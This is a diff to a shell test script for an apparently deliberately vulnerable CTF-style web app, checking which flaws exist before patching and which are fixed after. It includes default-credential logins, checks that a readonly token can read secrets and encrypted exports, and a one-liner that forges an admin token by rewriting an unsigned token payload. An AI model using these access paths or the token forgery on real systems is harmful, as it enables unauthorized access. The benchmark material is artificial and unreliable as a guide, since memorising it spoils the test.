@@ -46,14 +46,14 @@ ENGINEER_TOKEN=$(curl -sf -X POST "$BASE_URL/api/auth/login" \
   -d '{"username":"engineer","password":"password123"}' | python3 -c 'import json,sys; print(json.load(sys.stdin)["token"])')
 [ -n "$ENGINEER_TOKEN" ] || { echo "[FAIL] engineer SLA login missing"; exit 1; }
 
-STATUS=$(curl -s -o /tmp/s9-engineer-private.out -w "%{http_code}" \
-  -H "Authorization: Bearer $ENGINEER_TOKEN" \
-  "$BASE_URL/api/secrets/private")
-[ "$STATUS" = "403" ] || { echo "[FAIL] SLA engineer account should not directly reach flag_3"; exit 1; }
+REPORT=$(curl -sf -H "Authorization: Bearer $READONLY_TOKEN" "$BASE_URL/api/reports/mine")
+echo "$REPORT" | grep -q '"escalation_ref"' || { echo "[FAIL] readonly report does not expose escalation_ref"; exit 1; }
 
-PROFILE=$(curl -sf -H "Authorization: Bearer $READONLY_TOKEN" \
-  "$BASE_URL/api/users/profile?username=vaulteng")
-echo "$PROFILE" | grep -q '"password_hash"' || { echo "[FAIL] readonly user cannot leak engineer hash"; exit 1; }
+SECRET=$(curl -sf -H "Authorization: Bearer $READONLY_TOKEN" "$BASE_URL/api/secrets/1")
+echo "$SECRET" | grep -q '"content"' || { echo "[FAIL] secret detail lacks known plaintext content"; exit 1; }
+
+EXPORT=$(curl -sf -H "Authorization: Bearer $READONLY_TOKEN" "$BASE_URL/api/exports/encrypted?item=1")
+echo "$EXPORT" | grep -q '"cipher_hex"' || { echo "[FAIL] encrypted export missing cipher_hex"; exit 1; }
 
 FORGED_ADMIN_TOKEN=$(python3 -c 'import base64, json, sys; token = sys.argv[1]; raw = json.loads(base64.urlsafe_b64decode(token + "=" * (-len(token) % 4)).decode()); raw["username"] = "admin"; raw["role"] = "admin"; print(base64.urlsafe_b64encode(json.dumps(raw, separators=(",", ":")).encode()).decode().rstrip("="))' "$READONLY_TOKEN")
 STATUS=$(curl -s -o /tmp/s9-vault.out -w "%{http_code}" \
@@ -122,8 +122,8 @@ print(len(json.loads(lines[start:]).get('flags_captured', [])) if start != -1 el
 echo "[PASS] Patched: $CAPTURED/5 captured."
 
 echo "[test] Verifying /api/debug/config is removed..."
-STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$BASE_URL/api/debug/config")
-[ "$STATUS" != "200" ] || { echo "[FAIL] /api/debug/config still returns 200 after patch"; exit 1; }
-echo "[PASS] /api/debug/config returns $STATUS (not 200)."
+STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$BASE_URL/api/internal/env")
+[ "$STATUS" != "200" ] || { echo "[FAIL] /api/internal/env still returns 200 after patch"; exit 1; }
+echo "[PASS] /api/internal/env returns $STATUS (not 200)."
 
 echo "[PASS] All tests passed."
